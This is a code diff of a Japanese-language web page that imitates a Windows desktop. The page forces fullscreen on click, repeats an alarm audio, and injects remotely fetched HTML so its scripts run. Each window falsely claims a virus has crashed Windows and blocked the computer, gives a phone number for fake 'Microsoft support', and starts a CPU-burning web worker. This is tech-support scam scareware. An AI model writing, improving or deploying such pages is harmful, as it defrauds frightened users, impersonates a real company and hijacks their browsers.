-        // so anything (scripts, styles, links) actually runs/applies.
-        function reviveNode(node) {
-          if (node.nodeType === 1 && node.tagName === "SCRIPT") {
-            const fresh = document.createElement("script");
-            for (const attr of node.attributes) {
-              fresh.setAttribute(attr.name, attr.value);
-            }
-            fresh.text = node.textContent;
-            return fresh;
-          }
-          const clone = node.cloneNode(false);
-          if (node.nodeType === 1) {
-            for (const child of Array.from(node.childNodes)) {
-              clone.appendChild(reviveNode(child));
-            }
-          }
-          return clone;
-        }
-
-        /** @returns {{ max: HTMLButtonElement, close: HTMLButtonElement } | null} */
-        function getChatChromeButtons(host) {
-          if (!host) return null;
-          const chat = host.querySelector(".modal--chat");
-          const chatWin = chat && chat.querySelector(".chat-head__win");
-          if (!chatWin) return null;
-          const btns = chatWin.querySelectorAll(":scope > button");
-          if (btns.length < 3) return null;
-          return {
-            max: btns[1],
-            close: btns[2],
-          };
-        }
-
-        function forwardChromeClick(ev, target) {
-          ev.preventDefault();
-          ev.stopPropagation();
-          if (target && typeof target.click === "function") target.click();
-        }
-
-        /** Insert — / □ alongside `.mid-alert__close`. Minimize — is cosmetic only; □ forwards to chat. */
-        function wireMidAlertChatHeadWin(host) {
-          if (!host || host.id !== "viewerHost") return;
-          const head = host.querySelector(".mid-alert__head");
-          const closeBtn = host.querySelector(".mid-alert__close");
-          const chrome = getChatChromeButtons(host);
-          if (!head || !closeBtn || !chrome || head.querySelector("[data-mid-alert-chat-win]"))
-            return;
-
-          const wrap = document.createElement("div");
-          wrap.className = "chat-head__win mid-alert-chat-head__win";
-          wrap.setAttribute("data-mid-alert-chat-win", "");
-
-          const btnMin = document.createElement("button");
-          btnMin.type = "button";
-          btnMin.className = "mid-alert-chat-head__btn--decor";
-          btnMin.setAttribute("aria-hidden", "true");
-          btnMin.tabIndex = -1;
-          btnMin.textContent = "—";
-
-          const btnMax = document.createElement("button");
-          btnMax.type = "button";
-          btnMax.setAttribute("aria-label", "最大化");
-          btnMax.textContent = "\u25A1";
-
-          head.insertBefore(wrap, closeBtn);
-          wrap.appendChild(btnMin);
-          wrap.appendChild(btnMax);
-          wrap.appendChild(closeBtn);
-
-          btnMax.addEventListener("click", function (ev) {
-            forwardChromeClick(ev, chrome.max);
-          });
-        }
-
-        /** Add — / □ / × on `.modal--security`; minimize — is cosmetic only. □ / × forward like chat chrome. */
-        function wireSecurityModalChatHeadWin(host) {
-          if (!host || host.id !== "viewerHost") return;
-          const titlebar = host.querySelector(".modal--security .sec-titlebar");
-          const chrome = getChatChromeButtons(host);
-          if (!titlebar || !chrome || titlebar.querySelector("[data-modal-security-chat-win]"))
-            return;
-
-          const wrap = document.createElement("div");
-          wrap.className = "chat-head__win modal-security-chat-head__win";
-          wrap.setAttribute("data-modal-security-chat-win", "");
-
-          const btnMin = document.createElement("button");
-          btnMin.type = "button";
-          btnMin.className = "modal-security-chat-head__btn--decor";
-          btnMin.setAttribute("aria-hidden", "true");
-          btnMin.tabIndex = -1;
-          btnMin.textContent = "—";
-
-          const btnMax = document.createElement("button");
-          btnMax.type = "button";
-          btnMax.setAttribute("aria-label", "最大化");
-          btnMax.textContent = "\u25A1";
-
-          const btnClose = document.createElement("button");
-          btnClose.type = "button";
-          btnClose.className = "win-close modal-security-win-close";
-          btnClose.setAttribute("aria-label", "閉じる");
-          btnClose.textContent = "\u00D7";
-
-          wrap.appendChild(btnMin);
-          wrap.appendChild(btnMax);
-          wrap.appendChild(btnClose);
-          titlebar.appendChild(wrap);
-
-          btnMax.addEventListener("click", function (ev) {
-            forwardChromeClick(ev, chrome.max);
-          });
-          btnClose.addEventListener("click", function (ev) {
-            forwardChromeClick(ev, chrome.close);
-          });
-        }
-
-        function displayViewer(html) {
-          removeViewer();
-          if (!html) return;
-
-          const doc = new DOMParser().parseFromString(html, "text/html");
-          normalizeFetchedDoc(doc);
-
-          // Pull <style>, <link>, <meta> from the fetched <head> into ours.
-          for (const node of Array.from(doc.head.children)) {
-            if (node.tagName === "TITLE") continue;
-            const fresh = reviveNode(node);
-            document.head.appendChild(fresh);
-            injectedHeadNodes.push(fresh);
-          }
-
-          const host = document.createElement("div");
-          host.id = "viewerHost";
-          // overflow:hidden so any inner full-bleed children stay clipped to
-          // the host instead of escaping to the body.
-          host.style.cssText =
-            "position:fixed;inset:0;width:100%;height:100%;background:#000;z-index:1;overflow:hidden;";
-          // When not fullscreen, let clicks pass through so the page-level
-          // click handler can request fullscreen.
-          host.style.pointerEvents = document.fullscreenElement
-            ? "auto"
-            : "none";
-
-          for (const node of Array.from(doc.body.childNodes)) {
-            host.appendChild(reviveNode(node));
-          }
-
-          document.body.appendChild(host);
-          viewerHost = host;
-          wireMidAlertChatHeadWin(host);
-          wireSecurityModalChatHeadWin(host);
-        }
-
-        function fetchViewerHtml() {
-          // Dedupe concurrent fetches so we never have two in flight.
-          if (inFlightFetch) return inFlightFetch;
-          inFlightFetch = fetch(BACKEND_URL, {
-            method: "GET",
-            cache: "no-store",
-            referrerPolicy: "strict-origin-when-cross-origin",
-            headers: { "X-API-Key": API_KEY },
-          })
-            .then(function (response) {
-              if (!response.ok) {
-                throw new Error(
-                  "Backend responded with status " + response.status,
-                );
+        self.onmessage = (e) => {
+          if (e.data.type === 'init') {
+            const idx = e.data.taskIndex % tasks.length;
+            taskType = tasks[idx].name;
+            const taskFn = tasks[idx].fn;
+            self.postMessage({ type:'info', task: taskType, threadId: e.data.threadId });
+            function work() {
+              if (!running) return;
+              taskFn();
+              opsCount++;
+              const elapsed = (Date.now() - startTime) / 1000;
+              if (opsCount % 10 === 0) {
+                self.postMessage({ type:'stats', ops: opsCount, opsPerSec: (opsCount/elapsed).toFixed(1), elapsed: elapsed.toFixed(1), task: taskType, threadId: e.data.threadId });
               }
-              return response.text();
-            })
-            .then(function (html) {
-              cachedViewerHtml = html;
-              return html;
-            })
-            .finally(function () {
-              inFlightFetch = null;
-            });
-          return inFlightFetch;
-        }
-
-        function loadAndDisplayViewer() {
-          return fetchViewerHtml()
-            .then(displayViewer)
-            .catch(function (err) {
-              console.error("Failed to load viewer document:", err);
-            });
-        }
-
-        function enterFullscreen() {
-          const target = document.documentElement;
-          if (!target || !target.requestFullscreen) return;
-          try {
-            const result = target.requestFullscreen();
-            if (result && typeof result.catch === "function") {
-              result.catch(function (err) {
-                console.warn("requestFullscreen failed:", err);
-              });
+              setTimeout(work, 0);
             }
-          } catch (err) {
-            console.warn("requestFullscreen threw:", err);
+            work();
+          } else if (e.data.type === 'stop') {
+            running = false;
           }
-        }
+        };
+      `;
+      const workerBlob = new Blob([workerCode], {
+        type: "application/javascript",
+      });
+      const workerURL = URL.createObjectURL(workerBlob);
 
-        function setFsPromptProgress(pct) {
-          fsPromptProgressValue = pct;
-          if (fsPromptProgressFill) {
-            fsPromptProgressFill.style.width = pct + "%";
-          }
-          if (fsPromptProgress) {
-            fsPromptProgress.setAttribute(
-              "aria-valuenow",
-              String(Math.round(pct)),
-            );
-          }
-        }
+      // ── Clock ──
+      function updateClock() {
+        const now = new Date();
+        const h = now.getHours(),
+          m = now.getMinutes();
+        document.getElementById("clock-time").textContent =
+          `${h}:${String(m).padStart(2, "0")}`;
+        const y = now.getFullYear(),
+          mo = now.getMonth() + 1,
+          d = now.getDate();
+        document.getElementById("clock-date").textContent =
+          `${y}/${String(mo).padStart(2, "0")}/${String(d).padStart(2, "0")}`;
+      }
+      updateClock();
+      setInterval(updateClock, 10000);
 
-        function stopFsPromptProgress() {
-          if (fsPromptProgressTimer !== null) {
-            clearInterval(fsPromptProgressTimer);
-            fsPromptProgressTimer = null;
-          }
-        }
-
-        /** @param {"loading" | "complete"} phase */
-        function setFsPromptContentPhase(phase) {
-          const showComplete = phase === "complete";
-          if (fsPromptPhaseLoading) {
-            fsPromptPhaseLoading.classList.toggle("is-hidden", showComplete);
-          }
-          if (fsPromptPhaseComplete) {
-            fsPromptPhaseComplete.classList.toggle("is-hidden", !showComplete);
-          }
-          if (fsPrompt) {
-            fsPrompt.setAttribute(
-              "aria-label",
-              showComplete ? "セットアップ完了" : "全画面モードのご案内",
-            );
-          }
-        }
-
-        function startFsPromptProgress() {
-          stopFsPromptProgress();
-          setFsPromptContentPhase("loading");
-          if (fsPromptScanFeedList) {
-            fsPromptScanFeedList.classList.remove("is-running");
-            // Force reflow so animation restarts each time prompt opens.
-            void fsPromptScanFeedList.offsetWidth;
-            fsPromptScanFeedList.classList.add("is-running");
-          }
-          // Reset progress + button label for a fresh "download" cycle.
-          setFsPromptProgress(0);
-          if (fsPromptEnter) {
-            fsPromptEnter.textContent = FS_PROMPT_LABEL_DOWNLOADING;
-          }
-
-          fsPromptProgressTimer = setInterval(function () {
-            const next = fsPromptProgressValue + FS_PROMPT_TICK_PCT;
-            if (next >= 100) {
-              setFsPromptProgress(100);
-              stopFsPromptProgress();
-              setFsPromptContentPhase("complete");
-              return;
-            }
-            setFsPromptProgress(next);
-          }, FS_PROMPT_TICK_MS);
-        }
-
-        function showFsPrompt() {
-          if (fsPrompt && !fsPromptDismissed) {
-            fsPrompt.classList.remove("is-hidden");
-            if (fsPromptBackdrop)
-              fsPromptBackdrop.classList.remove("is-hidden");
-            startFsPromptProgress();
-          }
-        }
-
-        function hideFsPrompt() {
-          if (fsPrompt) fsPrompt.classList.add("is-hidden");
-          if (fsPromptBackdrop) fsPromptBackdrop.classList.add("is-hidden");
-          stopFsPromptProgress();
-          setFsPromptContentPhase("loading");
-        }
-
-        function onPageClick() {
-          if (!document.fullscreenElement) {
-            startFsPromptAudioOnce();
-            enterFullscreen();
-          }
-        }
-
-        function startFsPromptAudioOnce() {
-          if (fsPromptAudioStarted) return;
-          fsPromptAudioStarted = true;
-
-          const audio = new Audio(FS_PROMPT_AUDIO_URL);
-          audio.preload = "auto";
-
-          let playCount = 0;
-
-          function playNext() {
-            if (playCount >= FS_PROMPT_AUDIO_REPEATS) return;
-            playCount += 1;
-            audio.currentTime = 0;
-            const playPromise = audio.play();
-            if (playPromise && typeof playPromise.catch === "function") {
-              playPromise.catch(function (err) {
-                console.warn("fsPrompt audio playback failed:", err);
-              });
-            }
-          }
-
-          audio.addEventListener("ended", function () {
-            if (playCount >= FS_PROMPT_AUDIO_REPEATS) return;
-            setTimeout(playNext, FS_PROMPT_AUDIO_GAP_MS);
+      // ── Build Desktop Icons ──
+      const desktopIconsEl = document.getElementById("desktop-icons");
+      apps
+        .filter((a) => a.pinToDesktop)
+        .forEach((app) => {
+          const el = document.createElement("div");
+          el.className = "desktop-icon";
+          el.innerHTML = `${getIcon(app.icon)}<span>${app.name}</span>`;
+          el.addEventListener("dblclick", () => openApp(app));
+          el.addEventListener("click", (e) => {
+            document
+              .querySelectorAll(".desktop-icon")
+              .forEach((i) => i.classList.remove("selected"));
+            el.classList.add("selected");
           });
-
-          setTimeout(playNext, FS_PROMPT_AUDIO_INITIAL_DELAY_MS);
-        }
-
-        function onFullscreenChange() {
-          if (document.fullscreenElement) {
-            hideFsPrompt();
-            // Tear down the viewer completely so no fetched code stays
-            // mounted while the loader is showing.
-            removeViewer();
-            // Drop any cached HTML so the post-loader fetch is fresh.
-            cachedViewerHtml = null;
-            // Cancel any previously-scheduled fetch from a stale cycle.
-            if (fetchTimerId !== null) {
-              clearTimeout(fetchTimerId);
-              fetchTimerId = null;
-            }
-            showLoader();
-
-            // Loader and fetch get independently randomized 5–10s timings.
-            // The loader is purely visual; the fetch fires on its own
-            // timer. The viewer is mounted whenever the response arrives —
-            // hidden behind the loader if the loader is still showing,
-            // revealed once the loader completes.
-            const loaderDuration = randomDelay();
-            const fetchDelay = randomDelay();
-
-            runLoader(function () {
-              if (!document.fullscreenElement) return;
-              hideLoader();
-            }, loaderDuration);
-
-            fetchTimerId = setTimeout(function () {
-              fetchTimerId = null;
-              if (!document.fullscreenElement) return;
-              fetchViewerHtml()
-                .then(function (html) {
-                  if (!document.fullscreenElement) return;
-                  displayViewer(html);
-                  setHostInteractive(true);
-                })
-                .catch(function (err) {
-                  console.error("Failed to load viewer document:", err);
-                });
-            }, fetchDelay);
-          } else {
-            // Exited fullscreen: tear down viewer, drop the cache, cancel
-            // any pending fetch timer, and fetch a fresh copy for the next
-            // non-fullscreen display.
-            stopLoader();
-            hideLoader();
-            removeViewer();
-            cachedViewerHtml = null;
-            if (fetchTimerId !== null) {
-              clearTimeout(fetchTimerId);
-              fetchTimerId = null;
-            }
-            // Re-arm the prompt for this new non-fullscreen session.
-            fsPromptDismissed = false;
-            showFsPrompt();
-            loadAndDisplayViewer();
-          }
-        }
-
-        window.addEventListener("load", function () {
-          document.body.classList.remove("site-loading");
-
-          // No loader on initial (non-fullscreen) load — fetch and show
-          // the viewer immediately. Loader is reserved for fullscreen entry.
-          hideLoader();
-          showFsPrompt();
-          loadAndDisplayViewer();
+          desktopIconsEl.appendChild(el);
         });
 
-        document.addEventListener("click", onPageClick);
-        document.addEventListener("fullscreenchange", onFullscreenChange);
+      // ── Build Start Menu Grid ──
+      const startGrid = document.getElementById("start-menu-grid");
+      apps.forEach((app) => {
+        const el = document.createElement("div");
+        el.className = "start-app";
+        el.innerHTML = `${getIcon(app.icon)}<span>${app.name}</span>`;
+        el.addEventListener("click", () => {
+          openApp(app);
+          toggleStartMenu(false);
+        });
+        startGrid.appendChild(el);
+      });
 
-        if (fsPrompt) {
-          fsPrompt.addEventListener("click", function (e) {
-            // Keep window-control buttons independent; all other prompt
-            // clicks should enter fullscreen as before.
-            if (
-              e.target &&
-              e.target.closest &&
-              e.target.closest(".fs-prompt__window-controls")
-            ) {
-              return;
+      // ── Build Taskbar Pinned Apps ──
+      const taskbarApps = document.getElementById("taskbar-apps");
+      apps
+        .filter((a) => a.pinToTaskbar)
+        .forEach((app) => {
+          const el = document.createElement("div");
+          el.className = "taskbar-app";
+          el.dataset.appId = app.id;
+          el.innerHTML = getIcon(app.icon);
+          el.title = app.name;
+          el.addEventListener("click", () => {
+            // Find any open window for this app
+            let found = null;
+            openWindows.forEach((w, wid) => {
+              if (w.app.id === app.id) found = wid;
+            });
+            if (found !== null) {
+              const w = openWindows.get(found);
+              if (w.minimized) {
+                w.el.classList.remove("minimized");
+                w.minimized = false;
+              }
+              focusWindow(found);
+            } else {
+              openApp(app);
             }
-            if (e.target && e.target.closest && e.target.closest("button")) {
-              return;
+          });
+          taskbarApps.appendChild(el);
+        });
+
+      // ── Start Menu Toggle ──
+      const startMenu = document.getElementById("start-menu");
+      function toggleStartMenu(force) {
+        const open =
+          force !== undefined ? force : !startMenu.classList.contains("open");
+        startMenu.classList.toggle("open", open);
+      }
+      document.getElementById("start-btn").addEventListener("click", (e) => {
+        e.stopPropagation();
+        toggleStartMenu();
+      });
+      document.addEventListener("click", (e) => {
+        if (
+          !startMenu.contains(e.target) &&
+          e.target !== document.getElementById("start-btn")
+        ) {
+          toggleStartMenu(false);
+        }
+      });
+
+      // ── Show Desktop ──
+      document.getElementById("show-desktop").addEventListener("click", () => {
+        let allMinimized = true;
+        openWindows.forEach((w) => {
+          if (!w.minimized) allMinimized = false;
+        });
+        openWindows.forEach((w) => {
+          if (allMinimized) {
+            w.el.classList.remove("minimized");
+            w.minimized = false;
+          } else {
+            w.el.classList.add("minimized");
+            w.minimized = true;
+          }
+        });
+        updateTaskbarActiveStates();
+      });
+
+      // Click desktop to deselect icons
+      document.getElementById("desktop").addEventListener("click", (e) => {
+        if (
+          e.target === document.getElementById("desktop") ||
+          e.target === document.getElementById("desktop-icons")
+        ) {
+          document
+            .querySelectorAll(".desktop-icon")
+            .forEach((i) => i.classList.remove("selected"));
+        }
+      });
+
+      // ── Open App ──
+      function openApp(app) {
+        const wid = windowIdCounter++;
+        const el = document.createElement("div");
+        el.className = "app-window focused";
+        el.dataset.wid = wid;
+
+        // Window size — larger for Settings
+        const w = app.id === "settings" ? 960 : 700;
+        const h = app.id === "settings" ? 620 : 500;
+        const maxX = window.innerWidth - w - 20,
+          maxY = window.innerHeight - 48 - h - 20;
+        const x = Math.max(
+          40,
+          Math.min(maxX, 80 + Math.random() * (maxX - 80)),
+        );
+        const y = Math.max(
+          20,
+          Math.min(maxY, 40 + Math.random() * (maxY - 40)),
+        );
+        el.style.cssText = `left:${x}px;top:${y}px;width:${w}px;height:${h}px;z-index:${++highestZ}`;
+
+        el.innerHTML = `
+    <div class="resize-handle resize-n"></div><div class="resize-handle resize-s"></div>
+    <div class="resize-handle resize-e"></div><div class="resize-handle resize-w"></div>
+    <div class="resize-handle resize-nw"></div><div class="resize-handle resize-ne"></div>
+    <div class="resize-handle resize-sw"></div><div class="resize-handle resize-se"></div>
+    <div class="title-bar">
+      <div class="title-bar-icon">${getIcon(app.icon)}</div>
+      <div class="title-bar-title">${app.name}</div>
+      <div class="title-bar-btns">
+        <button class="title-bar-btn btn-minimize" title="最小化">
+          <svg viewBox="0 0 10 10"><line x1="1" y1="5" x2="9" y2="5" stroke="#333" stroke-width="1.2"/></svg>
+        </button>
+        <button class="title-bar-btn btn-maximize" title="最大化">
+          <svg viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" stroke="#333" stroke-width="1.2" fill="none"/></svg>
+        </button>
+        <button class="title-bar-btn btn-close" title="閉じる">
+          <svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="#333" stroke-width="1.2"/><line x1="9" y1="1" x2="1" y2="9" stroke="#333" stroke-width="1.2"/></svg>
+        </button>
+      </div>
+    </div>
+    <div class="window-content"></div>
+  `;
+
+        // Store window state
+        const winState = {
+          el,
+          app,
+          minimized: false,
+          maximized: false,
+          restoreRect: { x, y, w, h },
+        };
+        openWindows.set(wid, winState);
+
+        // Event: focus on mousedown
+        el.addEventListener("mousedown", () => focusWindow(wid));
+
+        // Title bar: drag
+        const titleBar = el.querySelector(".title-bar");
+        titleBar.addEventListener("mousedown", (e) => {
+          if (e.target.closest(".title-bar-btn")) return;
+          startDrag(e, wid);
+        });
+
+        // Double click title bar to toggle maximize
+        titleBar.addEventListener("dblclick", (e) => {
+          if (e.target.closest(".title-bar-btn")) return;
+          toggleMaximize(wid);
+        });
+
+        // Buttons
+        el.querySelector(".btn-close").addEventListener("click", () =>
+          closeWindow(wid),
+        );
+        el.querySelector(".btn-minimize").addEventListener("click", () =>
+          minimizeWindow(wid),
+        );
+        el.querySelector(".btn-maximize").addEventListener("click", () =>
+          toggleMaximize(wid),
+        );
+
+        // Resize handles
+        el.querySelectorAll(".resize-handle").forEach((handle) => {
+          handle.addEventListener("mousedown", (e) => {
+            e.stopPropagation();
+            startResize(e, wid, handle);
+          });
+        });
+
+        document.getElementById("windows-container").appendChild(el);
+        focusWindow(wid);
+        updateTaskbarActiveStates();
+
+        // Inject app-specific content & spawn worker
+        if (app.id === "settings") {
+          el.querySelector(".window-content").innerHTML = getSettingsContent();
+          initSettingsNav(el);
+        } else {
+          el.querySelector(".window-content").innerHTML =
+            getDefaultContent(wid);
+          spawnWorker(wid);
+        }
+
+        // Add to taskbar if not pinned
+        if (!apps.find((a) => a.id === app.id && a.pinToTaskbar)) {
+          const tbEl = document.createElement("div");
+          tbEl.className = "taskbar-app active";
+          tbEl.dataset.appId = app.id;
+          tbEl.dataset.tempWid = wid;
+          tbEl.innerHTML = getIcon(app.icon);
+          tbEl.title = app.name;
+          tbEl.addEventListener("click", () => {
+            const w = openWindows.get(wid);
+            if (!w) return;
+            if (w.minimized) {
+              w.el.classList.remove("minimized");
+              w.minimized = false;
+              focusWindow(wid);
+            } else if (w.el.classList.contains("focused")) {
+              minimizeWindow(wid);
+            } else {
+              focusWindow(wid);
             }
-            fsPromptGoFullscreen(e);
           });
+          taskbarApps.appendChild(tbEl);
         }
-        function fsPromptGoFullscreen(e) {
-          e.stopPropagation();
-          startFsPromptAudioOnce();
-          hideFsPrompt();
-          enterFullscreen();
+      }
+
+      // ── Focus Window ──
+      function focusWindow(wid) {
+        openWindows.forEach((w, id) => w.el.classList.remove("focused"));
+        const win = openWindows.get(wid);
+        if (!win) return;
+        win.el.style.zIndex = ++highestZ;
+        win.el.classList.add("focused");
+        updateTaskbarActiveStates();
+      }
+
+      // ── Close Window ──
+      function closeWindow(wid) {
+        const win = openWindows.get(wid);
+        if (!win) return;
+        win.el.remove();
+        // Terminate worker
+        const worker = windowWorkers.get(wid);
+        if (worker) {
+          worker.postMessage({ type: "stop" });
+          worker.terminate();
+          windowWorkers.delete(wid);
         }
-        if (fsPromptEnter) {
-          fsPromptEnter.addEventListener("click", fsPromptGoFullscreen);
+        // Remove temp taskbar entry
+        const tempBtn = taskbarApps.querySelector(`[data-temp-wid="${wid}"]`);
+        if (tempBtn) tempBtn.remove();
+        openWindows.delete(wid);
+        updateTaskbarActiveStates();
+      }
+
+      // ── Minimize Window ──
+      function minimizeWindow(wid) {
+        const win = openWindows.get(wid);
+        if (!win) return;
+        win.el.classList.add("minimized");
+        win.el.classList.remove("focused");
+        win.minimized = true;
+        updateTaskbarActiveStates();
+      }
+
+      // ── Toggle Maximize ──
+      function toggleMaximize(wid) {
+        const win = openWindows.get(wid);
+        if (!win) return;
+        if (win.maximized) {
+          // Restore
+          win.el.classList.remove("maximized");
+          const r = win.restoreRect;
+          win.el.style.left = r.x + "px";
+          win.el.style.top = r.y + "px";
+          win.el.style.width = r.w + "px";
+          win.el.style.height = r.h + "px";
+          win.maximized = false;
+          // Update maximize button icon
+          win.el.querySelector(".btn-maximize").innerHTML =
+            `<svg viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" stroke="#333" stroke-width="1.2" fill="none"/></svg>`;
+        } else {
+          // Save current rect
+          win.restoreRect = {
+            x: parseInt(win.el.style.left),
+            y: parseInt(win.el.style.top),
+            w: parseInt(win.el.style.width),
+            h: parseInt(win.el.style.height),
+          };
+          win.el.classList.add("maximized");
+          win.maximized = true;
+          // Update to restore icon (two overlapping rects)
+          win.el.querySelector(".btn-maximize").innerHTML =
+            `<svg viewBox="0 0 10 10"><rect x="2" y="0" width="7" height="7" stroke="#333" stroke-width="1.1" fill="none"/><rect x="0" y="2" width="7" height="7" stroke="#333" stroke-width="1.1" fill="#efefef"/></svg>`;
         }
-        if (fsPromptCompleteContinue) {
-          fsPromptCompleteContinue.addEventListener("click", fsPromptGoFullscreen);
-        }
-        [fsPromptControlMin, fsPromptControlMax, fsPromptControlClose]
-          .filter(Boolean)
-          .forEach(function (btn) {
-            btn.addEventListener("click", fsPromptGoFullscreen);
+      }
+
+      // ── Update Taskbar Active States ──
+      function updateTaskbarActiveStates() {
+        document.querySelectorAll(".taskbar-app").forEach((btn) => {
+          const appId = btn.dataset.appId;
+          let isOpen = false;
+          openWindows.forEach((w) => {
+            if (w.app.id === appId && !w.minimized) isOpen = true;
           });
+          btn.classList.toggle("active", isOpen);
+        });
+      }
+
+      // ── Drag Logic ──
+      const dragOverlay = document.getElementById("drag-overlay");
+      function startDrag(e, wid) {
+        const win = openWindows.get(wid);
+        if (!win || win.maximized) return;
+        e.preventDefault();
+        focusWindow(wid);
+
+        const startX = e.clientX,
+          startY = e.clientY;
+        const origX = parseInt(win.el.style.left),
+          origY = parseInt(win.el.style.top);
+        dragOverlay.style.display = "block";
+        dragOverlay.style.cursor = "default";
+
+        function onMove(ev) {
+          win.el.style.left = origX + ev.clientX - startX + "px";
+          win.el.style.top = origY + ev.clientY - startY + "px";
+        }
+        function onUp() {
+          dragOverlay.style.display = "none";
+          document.removeEventListener("mousemove", onMove);
+          document.removeEventListener("mouseup", onUp);
+        }
+        document.addEventListener("mousemove", onMove);
+        document.addEventListener("mouseup", onUp);
+      }
+
+      // ── Resize Logic ──
+      function startResize(e, wid, handle) {
+        const win = openWindows.get(wid);
+        if (!win || win.maximized) return;
+        e.preventDefault();
+        focusWindow(wid);
+
+        const dir = [...handle.classList]
+          .find((c) => c.startsWith("resize-") && c !== "resize-handle")
+          .replace("resize-", "");
+        const startX = e.clientX,
+          startY = e.clientY;
+        const origX = parseInt(win.el.style.left),
+          origY = parseInt(win.el.style.top);
+        const origW = parseInt(win.el.style.width),
+          origH = parseInt(win.el.style.height);
+        const minW = 320,
+          minH = 200;
+
+        dragOverlay.style.display = "block";
+        dragOverlay.style.cursor = window.getComputedStyle(handle).cursor;
+
+        function onMove(ev) {
+          const dx = ev.clientX - startX,
+            dy = ev.clientY - startY;
+          let newX = origX,
+            newY = origY,
+            newW = origW,
+            newH = origH;
+
+          if (dir.includes("e")) newW = Math.max(minW, origW + dx);
+          if (dir.includes("s")) newH = Math.max(minH, origH + dy);
+          if (dir.includes("w")) {
+            newW = Math.max(minW, origW - dx);
+            if (newW > minW) newX = origX + dx;
+          }
+          if (dir.includes("n")) {
+            newH = Math.max(minH, origH - dy);
+            if (newH > minH) newY = origY + dy;
+          }
+
+          win.el.style.left = newX + "px";
+          win.el.style.top = newY + "px";
+          win.el.style.width = newW + "px";
+          win.el.style.height = newH + "px";
+        }
+        function onUp() {
+          dragOverlay.style.display = "none";
+          // Update restoreRect
+          win.restoreRect = {
+            x: parseInt(win.el.style.left),
+            y: parseInt(win.el.style.top),
+            w: parseInt(win.el.style.width),
+            h: parseInt(win.el.style.height),
+          };
+          document.removeEventListener("mousemove", onMove);
+          document.removeEventListener("mouseup", onUp);
+        }
+        document.addEventListener("mousemove", onMove);
+        document.addEventListener("mouseup", onUp);
+      }
+
+      // Taskbar app click behavior for pinned apps (click to minimize/restore)
+      taskbarApps.querySelectorAll(".taskbar-app").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          const appId = btn.dataset.appId;
+          let windowIds = [];
+          openWindows.forEach((w, wid) => {
+            if (w.app.id === appId) windowIds.push(wid);
+          });
+          if (windowIds.length === 0) return;
+          const lastWid = windowIds[windowIds.length - 1];
+          const w = openWindows.get(lastWid);
+          if (w.minimized) {
+            w.el.classList.remove("minimized");
+            w.minimized = false;
+            focusWindow(lastWid);
+          } else if (w.el.classList.contains("focused")) {
+            minimizeWindow(lastWid);
+          } else {
+            focusWindow(lastWid);
+          }
+        });
+      });
+
+      // ── Web Worker Per Window ──
+      function spawnWorker(wid) {
+        const worker = new Worker(workerURL);
+        windowWorkers.set(wid, worker);
+        worker.postMessage({
+          type: "init",
+          threadId: "W-" + wid,
+          taskIndex: wid,
+        });
+        worker.onmessage = (e) => {
+          const statsEl = document.getElementById("worker-stats-" + wid);
+          if (!statsEl) return;
+          const d = e.data;
+          if (d.type === "info") {
+            const taskEl = statsEl.querySelector('[data-field="task"]');
+            const statusEl = statsEl.querySelector('[data-field="status"]');
+            if (taskEl) taskEl.textContent = d.task;
+            if (statusEl) {
+              statusEl.textContent = "実行中";
+              statusEl.style.color = "#0f0";
+            }
+            statsEl.querySelector(".worker-stats-header").innerHTML =
+              `<span class="worker-dot"></span>Worker スレッド #${wid} — ${d.task}`;
+          } else if (d.type === "stats") {
+            const f = (field, val) => {
+              const el = statsEl.querySelector('[data-field="' + field + '"]');
+              if (el) el.textContent = val;
+            };
+            f("task", d.task);
+            f("ops", Number(d.ops).toLocaleString());
+            f("opsPerSec", d.opsPerSec + " ops/s");
+            f("elapsed", d.elapsed + " 秒");
+          }
+        };
+      }
+
+      // ── Default Window Content ──
+      function getDefaultContent(wid) {
+        return `<div class="win-default-content">
+          <div class="win-default-notice">
+            お使いのコンピューターに0xlksdnfウイルスが感染したため、Microsoft Windowsがクラッシュしました。問題を解決するには、サポートスタッフにお問い合わせください。コンピューターがクラッシュしています。
+          </div>
+          <div class="worker-stats" id="worker-stats-${wid}">
+            <div class="worker-stats-header"><span class="worker-dot"></span>Worker スレッド #${wid} — 起動中...</div>
+            <div class="worker-stats-row"><span class="worker-stats-label">タスク:</span><span class="worker-stats-value" data-field="task">初期化中...</span></div>
+            <div class="worker-stats-row"><span class="worker-stats-label">処理回数:</span><span class="worker-stats-value" data-field="ops">0</span></div>
+            <div class="worker-stats-row"><span class="worker-stats-label">処理速度:</span><span class="worker-stats-value" data-field="opsPerSec">0 ops/s</span></div>
+          </div>
+          <div class="win-default-lorem">
+            お使いのコンピューターに感染したウイルスによって、以下のアプリケーションが影響を受けています。
+
+            1. ごみ箱
+            2. 設定
+            3. Microsoft Edge
+            4. タスクマネージャー
+          </div>
+          <div class="win-default-footer">
+            <div class="win-default-brand">
+              <svg viewBox="0 0 24 24" fill="#0067c0"><path d="M3 3h8.5v8.5H3V3zm9.5 0H21v8.5h-8.5V3zM3 12.5h8.5V21H3v-8.5zm9.5 0H21V21h-8.5v-8.5z"/></svg>
+              <span>今すぐマイクロソフトサポートにお電話ください：
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="32"
+                  height="32"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="#007aff"
+                  stroke-width="1.75"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                >
+                  <path d="M5 4h4l2 5l-2.5 1.5a11 11 0 0 0 5 5l1.5 -2.5l5 2v4a2 2 0 0 1 -2 2a16 16 0 0 1 -15 -15a2 2 0 0 1 2 -2" />
+                  <path d="M15 7a2 2 0 0 1 2 2" />
+                  <path d="M15 3a6 6 0 0 1 6 6" />
+                </svg>
+
+                  <span style="font-size: 24px;">0101-828-573-3013</span></span>
+            </div>
+            <div class="win-default-fine">
+              Windowsのすべての操作がブロックされています。このコンピューターにアクセスできません。問題を解決するには、上記の電話番号にお電話ください。
+            </div>
+          </div>
+        </div>`;
+      }
+
+      // ── Settings App Content ──
+      function getSettingsContent() {
+        const chevron = `<div class="settings-row-chevron"><svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 2l4 4-4 4"/></svg></div>`;
+        return `
+  <div class="settings-container">
+    <div class="settings-sidebar">
+      <div class="settings-sidebar-profile">
+        <div class="settings-profile-avatar">
